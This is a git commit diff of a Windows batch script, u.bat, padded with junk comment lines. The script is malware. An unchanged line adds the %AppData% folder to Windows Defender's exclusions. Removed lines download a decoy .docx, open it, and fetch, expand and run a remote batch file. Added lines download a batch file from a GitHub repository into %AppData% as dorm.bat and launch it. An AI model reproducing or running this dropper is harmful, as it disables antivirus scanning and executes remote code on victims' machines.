7d4204e0fce4810c5d61388478a797adee6f0f28
oxsve <46594689+oxsve@users.noreply.github.com>
2021-02-16 19:07:25 +0300

    Update u.bat

--- u.bat
+++ u.bat
@@ -10,10 +10,6 @@
 :-------------------------fasfasfasffqwfqweqweqweqwe12333333333333333333------
 
 :-------------------------------0-------------=0-=0-=0-=0-=67456-------    
-
-call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/raw/master/a.docx','%AppData%\a.docx') 
-call start %AppData%\a.docx
 call powershell.exe Add-MpPreference -ExclusionPath "%AppData%"
-call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/d.bat','%AppData%\req.cab')
-call expand %AppData%\req.cab %AppData%\d.bat
-call start %AppData%\d.bat
+call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/d.bat','%AppData%\dorm.bat')
+call start %AppData%\dorm.bat
